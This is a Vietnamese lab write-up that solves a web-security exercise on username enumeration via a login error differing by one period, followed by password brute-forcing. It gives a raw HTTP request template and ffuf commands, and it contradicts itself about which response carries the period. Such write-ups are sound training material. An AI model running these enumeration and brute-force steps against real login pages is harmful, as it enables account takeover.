![[Pasted image 20261002171532.png]]
-mô tả lab: giống bài [[Lab-Username enumeration via different responses]], nhưng lần này câu báo lỗi nó chỉ khác nhau cực kỳ tinh vi, nhìn mắt thường không ra.

> [!NOTE]
> -trước mình tưởng lab này bị lỗi rồi, không có tổ hợp mật khẩu nào pass, kể cả pass mẫu cũng không được. Sau này mình mới hiểu là do mình nhìn response bằng mắt thường nên không thấy điểm khác.

### hướng giải
- [ ] mình login thử `test:test`, sau đó quan sát gói tin trả về, mình thấy báo `Invalid username or password.`
- [ ] mình thử `carlos:test`, mình vẫn thấy báo `Invalid username or password.` y hệt
- [ ] => lúc đầu mình nghĩ là không enumerate được. Nhưng sau khi quan sát kỹ raw response trong Burp Repeater, mình thấy có 1 dấu `.` thừa ở cuối câu khi username đúng
- [ ] sai username: `Invalid username or password.` (có dấu `.`)
- [ ] đúng username + sai password: `Invalid username or password` (không có dấu `.`) -> khác nhau có 1 ký tự thôi
- [ ] nên mình không thể dùng `-fr` match cả câu được, mình phải soi length hoặc dùng regex

### giải
-bước 1: file `login.txt` của mình vẫn như cũ:
```
POST /login HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_CUA_MINH
Content-Type: application/x-www-form-urlencoded

username=USER&password=test
```

-bước 2: mình chạy ffuf nhưng không filter bằng string nữa, mình filter bằng response length:
```bash
ffuf -request login.txt -request-proto https -w usernames.txt:USER -fs 1500
# mình chạy 1 lần không filter để xem length chuẩn là bao nhiêu, sau đó mình loại hết length phổ biến đi
```
-sau khi quan sát bảng kết quả này, mình thấy tất cả đều length ~XXXX, chỉ có 1 dòng length lệch đi vài byte, đó là `carlos`.

-> nên mình chốt là `carlos`, chứ không phải lab lỗi như mình nghĩ lúc đầu.

-mẹo của mình: nếu vẫn khó nhìn, mình copy 2 response vào `diff` hoặc vào Burp Comparer là thấy ngay dấu `.` lệch.

-bước 3: có username rồi mình brute password như bài trước:
```
username=carlos&password=PASS
```
```bash
ffuf -request login.txt -request-proto https -w passwords.txt:PASS -mc 302 -fs 1500
```
-sau khi quan sát gói tin này, mình thấy chỉ khi password đúng thì server mới trả `302` về `/my-account`. Còn lại toàn `200`.
-> password mình tìm được là `montoya` (tùy instance).

-mình login lại `carlos:montoya` là solve.
